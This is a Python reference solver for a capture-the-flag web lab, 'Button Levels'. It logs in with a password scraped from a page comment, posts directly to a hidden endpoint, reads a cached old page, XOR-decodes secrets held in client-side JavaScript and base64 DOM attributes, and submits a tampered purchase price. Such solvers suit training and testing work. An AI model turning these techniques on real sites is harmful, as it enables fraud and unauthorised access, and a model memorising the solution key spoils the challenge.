#!/usr/bin/env python3
"""Colo reference solver for "Button Levels" (DOCKER delivery).

Works purely through the participant interface: given the lab's base URL, it logs in
and solves all five levels the way a player would (reading what the browser is handed),
printing ANSWER_1 .. ANSWER_5. It exits 0 only when every answer was obtained; any
missing step is a loud failure (non-zero exit), never a silent one.

Standard library only (no pip install), per the Colo author guide.

Usage:
    python remote_solver.py --url http://127.0.0.1:49152
"""
import argparse
import base64
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

FLAG_RE = re.compile(r"COLO_FLAG\{[^}]+\}")


class Solver:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
        )

    def _url(self, path):
        return self.base + path

    def get(self, path):
        with self.opener.open(self._url(path), timeout=15) as r:
            return r.read().decode("utf-8", "replace")

    def post(self, path, fields):
        data = urllib.parse.urlencode(fields).encode()
        with self.opener.open(self._url(path), data=data, timeout=15) as r:
            return r.read().decode("utf-8", "replace")

    # --- steps ---------------------------------------------------------------
    def login(self):
        page = self.get("/login")
        m = re.search(r"my password is (\S+)", page)
        if not m:
            raise RuntimeError("login: could not find the password comment on /login")
        password = m.group(1)
        # success redirects to the furthest level; a wrong answer re-renders with [ FAIL ]
        body = self.post("/login", {"name": "Alice", "password": password})
        if "FAIL" in body and "access denied" in body:
            raise RuntimeError("login: credentials rejected (name must be 'Alice')")
        return password

    def unlock(self, n, flag):
        body = self.post(f"/level/{n}/unlock", {"flag": flag})
        if "Wrong flag" in body:
            raise RuntimeError(f"unlock level {n}: server rejected flag {flag!r}")

    def level1(self):
        # the runaway button is a plain POST endpoint; press it directly
        import json
        body = self.post("/level/1/flag", {})
        try:
            flag = json.loads(body)["flag"]
        except Exception as e:
            raise RuntimeError(f"level 1: unexpected response {body!r} ({e})")
        return flag

    def level2(self):
        # the old cached version of the page still carries the flag
        page = self.get("/level/2/v1/")
        m = FLAG_RE.search(page)
        if not m:
            raise RuntimeError("level 2: no flag in /level/2/v1/")
        return m.group(0)

    def level3(self):
        # the secret lives in client-side JS, XOR-obfuscated across two arrays (__SK key, __SC cipher)
        import json
        page = self.get("/level/3")
        mk = re.search(r"__SK\s*=\s*(\[[^\]]*\])", page)
        mc = re.search(r"__SC\s*=\s*(\[[^\]]*\])", page)
        if not mk or not mc:
            raise RuntimeError("level 3: could not find __SK/__SC in the page")
        key = json.loads(mk.group(1))
        cipher = json.loads(mc.group(1))
        flag = "".join(chr(c ^ key[i % len(key)]) for i, c in enumerate(cipher))
        if not FLAG_RE.fullmatch(flag):
            raise RuntimeError(f"level 3: reconstructed secret is not a flag: {flag!r}")
        return flag

    def level4(self):
        # 50 notes; every note's content is already in the DOM (data-secret, base64).
        # 49 are COLO_FLAG{fake_NN} decoys, one is real.
        page = self.get("/level/4")
        blobs = re.findall(r'data-secret="([^"]+)"', page)
        if not blobs:
            raise RuntimeError("level 4: no data-secret blobs found")
        decoded = [base64.b64decode(b).decode("utf-8", "replace") for b in blobs]
        real = [v for v in decoded if FLAG_RE.fullmatch(v) and not v.startswith("COLO_FLAG{fake_")]
        if len(real) != 1:
            raise RuntimeError(f"level 4: expected exactly one real flag, got {real!r}")
        return real[0]

    def level5(self):
        # client-side price tampering: send any price <= balance for the beer;
        # the buy response then hands back the captcha with the flag base64-encoded.
        import json
        body = self.post("/level/5/buy", {"item": "beer", "price": "1"})
        try:
            data = json.loads(body)
            flag = base64.b64decode(data["captcha"]["flag_b64"]).decode("utf-8", "replace")
        except Exception as e:
            raise RuntimeError(f"level 5: unexpected buy response {body!r} ({e})")
        if not FLAG_RE.fullmatch(flag):
            raise RuntimeError(f"level 5: decoded value is not a flag: {flag!r}")
        return flag

    def solve(self):
        answers = []
        self.login()

        a1 = self.level1(); answers.append(a1)
        self.unlock(2, a1)

        a2 = self.level2(); answers.append(a2)
        self.unlock(3, a2)

        a3 = self.level3(); answers.append(a3)
        self.unlock(4, a3)

        a4 = self.level4(); answers.append(a4)
        self.unlock(5, a4)

        a5 = self.level5(); answers.append(a5)
        return answers


def main():
    ap = argparse.ArgumentParser(description="Colo reference solver for Button Levels")
    ap.add_argument("--url", required=True, help="base URL of the running lab, e.g. http://127.0.0.1:49152")
    args = ap.parse_args()

    try:
        answers = Solver(args.url).solve()
    except (urllib.error.URLError, RuntimeError) as e:
        print(f"SOLVE FAILED: {e}", file=sys.stderr)
        sys.exit(1)

    for i, ans in enumerate(answers, 1):
        print(f"ANSWER_{i}: {ans}")

    if len(answers) != 5:
        print(f"SOLVE INCOMPLETE: got {len(answers)}/5 answers", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
